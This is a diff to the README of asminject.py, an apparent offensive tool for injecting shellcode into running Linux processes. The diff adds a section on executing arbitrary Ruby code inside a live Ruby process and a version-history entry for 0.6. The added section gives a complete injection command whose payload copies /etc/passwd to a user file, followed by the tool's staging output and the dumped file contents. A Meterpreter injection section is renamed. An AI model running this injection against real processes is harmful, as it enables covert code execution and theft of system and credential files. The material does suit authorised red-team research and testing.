@@ -146,9 +146,57 @@ bin:*:18704:0:99999:7:::
 sys:*:18704:0:99999:7:::
 ```
 
-## Inject Meterpreter into an existing Python process
+## Execute arbitrary Ruby code inside an existing Ruby process
 
-Launch a harmless Python process that simulates one with access to super-secret, sensitive data:
+Ruby has a similar "compile and execute this sequence of Ruby source code" method. The current code for it in *asminject.py* has a few limitations, but it does work:
+
+* No ability to require additional Ruby gems
+* The targeted process will lock up after the injected code finishes executing
+
+```
+# python3 ./asminject.py 1639664 /asm/x86-64/execute_ruby_code.s --relative-offsets relative_offsets-copyroom-libruby-2.7.so.2.7.3-2021-09-01.txt --var rubycode "File.binwrite('/home/user/copied_using_ruby.txt', data = File.binread('/etc/passwd'))" --var rubyargv "/usr/bin/ruby" --stop-method "slow" --pause false --stage-mode mem
+
+...omitted for brevity...
+[*] Wrote first stage shellcode at 00007fcf9ab0149b in target process 1639664
+[*] Using '/usr/lib/x86_64-linux-gnu/libruby-2.7.so.2.7.3' for regex placeholder '.+/libruby[0-9\.so\-]+$' in assembly code
+[*] Writing assembled binary to /tmp/tmp7wxbeztc.o
+[*] RSP is 0x00007ffe8da03670
+[*] Value at RSP is 0x00007ffe8da03690
+[*] MMAP'd block is 0x00005598bbaa9228
+[*] Waiting for stage 1
+[*] RSP is 0x00007ffe8da03670
+[*] Value at RSP is 0x00007ffe8da03690
+[*] MMAP'd block is 0x00005598bbaa9228
+[*] Waiting for stage 1
+[*] RSP is 0x00007ffe8da035d0
+[*] Value at RSP is 0x0000000000000000
+[*] MMAP'd block is 0x00007fcf9af40000
+[*] Writing stage 2 to 0x00007fcf9af40000 in target memory
+[*] Writing 0x01 to 0x00007ffe8da035d0 in target memory to indicate OK
+[*] Stage 2 proceeding
+[*] Returning to normal time...
+[*] Setting process priority for asminject.py (PID: 1639670) to 0
+[*] Setting process priority for target process (PID: 1639664) to 0
+[*] Setting CPU affinity for target process (PID: 1639664) to [0, 1]
+[+] Done!
+                                                                                                                                                     
+
+# ls -al /home/user/copied_using_ruby.txt 
+-rw-r--r-- 1 user user 3472 Sep  1 18:01 /home/user/copied_using_ruby.txt
+
+# cat /home/user/copied_using_ruby.txt 
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...omitted for brevity...
+```
+
+
+## Inject Meterpreter into an existing process
+
+Launch a harmless process that simulates one with access to super-secret, sensitive data:
 
 ```
 $ sudo python2 ./calling_script.py
@@ -364,6 +412,12 @@ As the message indicates, this type of binary can be manually flagged using one 
 ```
 
 ### Version history
+
+#### 0.6 (2021-09-01)
+
+- Added Ruby injection code
+- Improved reliability
+- A few other bug fixes
 
 #### 0.5 (2021-08-31)
 
